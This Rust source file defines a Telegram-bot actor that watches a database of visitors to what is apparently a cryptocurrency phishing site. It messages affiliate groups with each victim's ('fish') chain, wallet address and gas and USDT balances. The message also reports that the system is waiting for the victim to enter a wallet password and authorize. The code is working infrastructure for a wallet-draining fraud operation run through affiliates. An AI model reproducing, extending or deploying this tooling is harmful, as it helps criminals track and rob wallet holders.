use rust_decimal::prelude::*;
use sea_orm::{ActiveValue, DatabaseConnection, EntityTrait};
use std::time::Duration;

use chrono::NaiveDateTime;
use kameo::{Actor, actor::ActorRef, mailbox::unbounded, prelude::Message};
use rust_decimal::Decimal;
use teloxide::{Bot, payloads::SendMessageSetters, prelude::Requester, types::Recipient};
use thiserror::Error;
use tracing::error;

use crate::{daili::daili_cache, fish_browse::fish_browse_cache};
use crate::utils::common::parse_native_date_time;

impl FishBrowseBroadCaster {
    pub(super) async fn spawn_link(
        supervisor: &ActorRef<impl Actor>,
        bot: Bot,
    ) -> anyhow::Result<ActorRef<Self>> {
        let db_conn = database::connection::get_connection().await?;
        let instance = FishBrowseBroadCaster { bot, db_conn };
        let actor_ref =
            Actor::spawn_link_with_mailbox(supervisor, instance, unbounded::<Self>()).await;
        actor_ref
            .wait_for_startup_with_result(|r| {
                r.map_err(|e| FishBrowseBroadCasterError::StartError(format!("{e:?}")))
            })
            .await?;

        Ok(actor_ref)
    }
}

#[derive(Debug, Error)]
pub(crate) enum FishBrowseBroadCasterError {
    #[error("start fish borwse broad caster faild: {0}")]
    StartError(String),
}

pub(crate) struct FishBrowseBroadCaster {
    db_conn: DatabaseConnection,
    bot: Bot,
}

impl Actor for FishBrowseBroadCaster {
    type Args = Self;

    type Error = FishBrowseBroadCasterError;

    async fn on_start(
        mut args: Self::Args,
        actor_ref: kameo::prelude::ActorRef<Self>,
    ) -> Result<Self, Self::Error> {
        args.work_loop(actor_ref).await;
        Ok(args)
    }
}

impl FishBrowseBroadCaster {
    async fn work_loop(&mut self, actor_ref: ActorRef<Self>) {
        self.do_work_loop().await;

        // 开启下一次工作循环
        tokio::spawn(async move {
            tokio::time::sleep(Duration::from_millis(3_000)).await;
            if let Err(e) = actor_ref.tell(WorkLoopCmd).await {
                error!("通知开启下一次工作循环失败: {e:?}");
            }
        });
    }

    async fn do_work_loop(&mut self) {
        let mut browsing_fishes = fish_browse_cache::filter_map(|item| {
            if item.state == 0 {
                let info = BrowsingFishInfo::from(item);
                Some(info)
            } else {
                None
            }
        });
        browsing_fishes.sort_by_key(|item| item.time);
        for browsing_fish in browsing_fishes {
            if let Some(unique_id) = &browsing_fish.unique_id {
                if let Some((user_name, group_id)) =
                    daili_cache::map(unique_id, |m| (m.username.clone(), m.groupid.clone()))
                {
                    if let Some(group_id) = group_id {
                        self.send_bot_message(group_id, &user_name, &browsing_fish)
                            .await;
                        self.set_broadcasted(browsing_fish.id).await;
                        tokio::time::sleep(Duration::from_millis(1_000)).await;
                    } else {
                        // 没有group id无法发送，因此也将状态设置为已经发送,避免重复检查
                        self.set_broadcasted(browsing_fish.id).await;
                    }
                }
            }
        }
    }

    async fn set_broadcasted(&self, id: i32) {
        let am = entities::entities::fish_browse::ActiveModel {
            id: ActiveValue::Set(id),
            state: ActiveValue::Set(1),
            ..Default::default()
        };
        let ret = entities::entities::fish_browse::Entity::update(am)
            .exec(&self.db_conn)
            .await;
        match ret {
            Ok(m) => {
                fish_browse_cache::cache(m);
            }
            Err(e) => {
                error!("更新[fish_browse]状态出错: {e:?}");
            }
        }
    }

    async fn send_bot_message<C>(
        &self,
        group_id: C,
        daili_user_name: &Option<String>,
        info: &BrowsingFishInfo,
    ) where
        C: Into<Recipient>,
    {
        let chain_id = &info.chain_id;
        let user_name = if let Some(user_name) = daili_user_name {
            format!("@{user_name}")
        } else {
            "".to_string()
        };
        let fish_address = &info.fish_address;
        let gas_balance = Self::convert_balance(&info.gas_balance);
        let usdt_balance = Self::convert_balance(&info.usdt_balance);
        let message = format!(
            "📣 访问播报：当前有鱼儿正在访问网站
🐟 【{chain_id}网络】鱼苗地址：{user_name}
<code>{fish_address}</code>
🪫 Gas 余额：<code>{gas_balance}</code>
💵 USDT余额：<code>${usdt_balance}</code>
👁‍🗨正在等待鱼苗输入钱包密码进行授权..."
        );
        if let Err(e) = self
            .bot
            .send_message(group_id, message)
            .parse_mode(teloxide::types::ParseMode::Html)
            .await
        {
            error!("发送fish_browse消息到bot失败: {e:?}");
        }
    }

    fn convert_balance(balance: &Option<Decimal>) -> String {
        if let Some(b) = balance {
            b.to_f64()
                .map(|f| f.to_string())
                .unwrap_or_else(|| "获取失败".to_string())
        } else {
            "获取失败".to_string()
        }
    }
}

struct WorkLoopCmd;
impl Message<WorkLoopCmd> for FishBrowseBroadCaster {
    type Reply = ();

    async fn handle(
        &mut self,
        _msg: WorkLoopCmd,
        ctx: &mut kameo::prelude::Context<Self, Self::Reply>,
    ) -> Self::Reply {
        self.work_loop(ctx.actor_ref().clone()).await;
    }
}

struct BrowsingFishInfo {
    id: i32,
    unique_id: Option<String>,
    fish_address: String,
    chain_id: String,
    gas_balance: Option<Decimal>,
    usdt_balance: Option<Decimal>,
    time: NaiveDateTime,
}

impl From<&entities::entities::fish_browse::Model> for BrowsingFishInfo {
    fn from(value: &entities::entities::fish_browse::Model) -> Self {
        let time = if let Some(t) = value.time.as_ref() {
            match parse_native_date_time(t) {
                Ok(d) => d,
                Err(e) => {
                    error!("解析FishBrowse.time出错: {e:?}");
                    NaiveDateTime::default()
                }
            }
        } else {
            error!("FishBrowse.time为None,使用默认时间");
            NaiveDateTime::default()
        };
        BrowsingFishInfo {
            id: value.id,
            unique_id: value.unique_id.clone(),
            fish_address: value.fish_address.clone(),
            chain_id: value.chainid.clone(),
            gas_balance: value.gas_balance,
            usdt_balance: value.usdt_balance,
            time,
        }
    }
}
